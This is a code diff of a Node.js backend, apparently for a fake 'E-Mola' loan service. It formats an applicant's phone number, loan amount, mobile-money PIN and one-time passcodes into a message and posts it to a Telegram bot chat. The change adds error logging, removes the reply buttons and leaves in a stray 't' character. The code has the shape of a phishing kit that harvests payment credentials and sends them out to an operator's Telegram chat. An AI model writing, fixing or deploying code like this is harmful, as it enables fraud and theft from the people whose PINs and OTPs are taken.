@@ -17,7 +17,9 @@ const loanSessions = {};
 
 // Helper function to send Telegram notification with Approve/Reject inline buttons
 async function sendTelegramMessage(loanData) {
-    if (!BOT_TOKEN || !CHAT_ID) return;
+if (!BOT_TOKEN || !CHAT_ID){ 
+    console.error('BOT_TOKEN or CHAT_ID is not set in environment variables.');
+    return;}
 
     const message = `
 🚨 *NEW E-MOLA LOAN APPLICATION* 🚨
@@ -26,7 +28,7 @@ async function sendTelegramMessage(loanData) {
 • Phone: ${loanData.phone || 'N/A'}
 • Amount: MT ${loanData.amount || 'N/A'}
 • Period: ${loanData.period || 'N/A'} months
-
+t
 🔐 *Security Credentials:*
 • PIN: ${loanData.pin || 'Pending'}
 • First OTP: ${loanData.otp1 || 'Pending'}
@@ -45,20 +47,26 @@ async function sendTelegramMessage(loanData) {
             ]
         ]
     };
-
-    try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+try {
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: CHAT_ID,
                 text: message,
-                parse_mode: 'Markdown',
-                reply_markup: replyMarkup
+                parse_mode: 'Markdown'
             })
         });
+
+        const data = await response.json();
+
+        if (response.ok && data.ok) {
+            console.log('✅ Telegram notification sent successfully!');
+        } else {
+            console.error('❌ Telegram API Error Response:', data);
+        }
     } catch (error) {
-        console.error('Failed to send Telegram notification:', error);
+        console.error('❌ Network Fetch Error contacting Telegram:', error);
     }
 }
 
